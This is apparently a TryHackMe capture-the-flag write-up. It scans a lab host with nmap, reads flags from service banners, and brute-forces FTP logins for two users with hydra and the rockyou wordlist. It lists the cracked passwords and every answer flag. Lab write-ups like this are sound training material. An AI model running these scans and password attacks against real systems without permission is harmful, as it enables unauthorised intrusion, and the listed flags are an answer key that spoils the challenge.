# NetSec_challenge_THM

## There is a given IP to us and we need to scan its network to solve the following challenges.

1. What is the highest port number being open less than 10,000?
    
    Solution → 
    
    Let’s do a tcp syn port scan. (-sS) [requires root privelege] (default)
    
    ```python
    sudo nmap -sV 10.201.95.163 
    ```
    
    ```
    Output --
    
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 17:12 EDT
    Nmap scan report for 10.201.95.163
    Host is up (0.30s latency).
    Not shown: 995 closed tcp ports (reset)
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         (protocol 2.0)
    80/tcp   open  http        lighttpd
    139/tcp  open  netbios-ssn Samba smbd 4
    445/tcp  open  netbios-ssn Samba smbd 4
    8080/tcp open  http        Node.js (Express middleware)
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port22-TCP:V=7.95%I=7%D=9/1%Time=68B60C33%P=x86_64-pc-linux-gnu%r(NULL,
    SF:2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 17.33 seconds
    ```
    
    **Answer to q1 → 8080**
    
2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?
    
    Solution →
    
    ```python
    // to check the ports ranging from (1 - 65535) T4 to be a little faster
    sudo nmap 10.201.95.163 -p- -T4
    ```
    
    ```
    Output --
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 17:20 EDT
    Nmap scan report for 10.201.95.163
    Host is up (0.25s latency).
    Not shown: 65529 closed tcp ports (reset)
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    8080/tcp  open  http-proxy
    10021/tcp open  unknown
    
    Nmap done: 1 IP address (1 host up) scanned in 729.49 seconds
    ```
    
    **Answer to q2 → 10021**
    
3. How many TCP ports are open?
    
    Solution → 
    
    From the previous nmap output we can see that there were 6 tcp ports.
    
    **Answer to q3 → 6**
    
4. What is the flag hidden in the HTTP server header?
    
    Solution → 
    
    ```
    nmap --script=http-server-header -p80 10.201.95.163 
    
    using script "http-server-header" and in port 80 at given ip
    ```
    
    ```
    Output ---
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 17:26 EDT
    Nmap scan report for 10.201.95.163
    Host is up (0.25s latency).
    
    PORT   STATE SERVICE
    80/tcp open  http
    |_http-server-header: lighttpd THM{web_server_25352}
    
    Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
    ```
    
    **Answer to q4 →** THM{web_server_25352}
    
5. What is the flag hidden in the SSH server header?
    
    Solution → 
    
    From previous nmap output, 
    
    **Answer to q5 → THM{946219583339}**
    
6. We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
    
    Solution →
    
    Guessing from “non standard port”, the port 10021 is the ftp port. For cross check, 
    
    ```
    nmap -sV 10.201.95.163 -p10021 
    ```
    
    ```
    Output ---
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 17:36 EDT
    Nmap scan report for 10.201.95.163
    Host is up (0.24s latency).
    
    PORT      STATE SERVICE VERSION
    10021/tcp open  ftp     vsftpd 3.0.5
    Service Info: OS: Unix
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
    ```
    
    **Answer to q6 → vsftpd 3.0.5**
    
7. We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?
    
    Solution → 
    
    First of all, keep in mind we are accessing ftp through a non standard port here → 10021
    
    We have 2 usernames “eddie” and “quinn”
    
    Using hydra we find the passwords to both in ftp protocol: 
    
    ```
    hydra -l quinn -P /usr/share/wordlists/rockyou.txt 10.201.95.163 ftp -s 10021
    hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.201.95.163 ftp -s 10021
    ```
    
    ```
    quinn - pass -> andrea
    eddie - pass -> jordan
    ```
    
    After that we connect to it using ftp protocol on port 10021
    
    ```
    ftp 10.201.95.163 10021
    ```
    
    Check for both eddie and quinn and find the ftp_flag.txt file in quinn’s directory. We “get“ the file onto our own directory. 
    
    **Answer to q7 → THM{321452667098}**
    
8. Browsing to `http://10.201.95.163:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?
    
    Solution  →
    
    Performing a null scan will reveal the flag
    
    **Answer to q8→ THM{f7443f99}**